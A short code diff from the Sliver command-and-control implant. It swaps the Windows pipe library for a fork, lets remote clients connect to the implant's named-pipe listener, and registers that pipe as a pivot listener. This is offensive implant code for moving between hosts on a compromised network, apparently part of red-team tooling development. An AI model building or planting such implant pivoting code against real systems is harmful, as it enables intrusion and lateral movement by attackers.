@@ -28,21 +28,29 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Microsoft/go-winio"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/lesnuages/go-winio"
 
 	"github.com/golang/protobuf/proto"
 )
 
 func StartNamedPipeListener(pipeName string) error {
-	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
+	fullName := "\\\\.\\pipe\\" + pipeName
+	config := &winio.PipeConfig{
+		RemoteClientMode: true,
+	}
+	ln, err := winio.ListenPipe(fullName, config)
 	// {{if .Config.Debug}}
-	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
+	log.Printf("Listening on %s", fullName)
 	// {{end}}
 	if err != nil {
 		return err
 	}
+	pivotListeners = append(pivotListeners, &PivotListener{
+		Type:          "named-pipe",
+		RemoteAddress: fullName,
+	})
 	go nampedPipeAcceptNewConnection(&ln)
 	return nil
 }
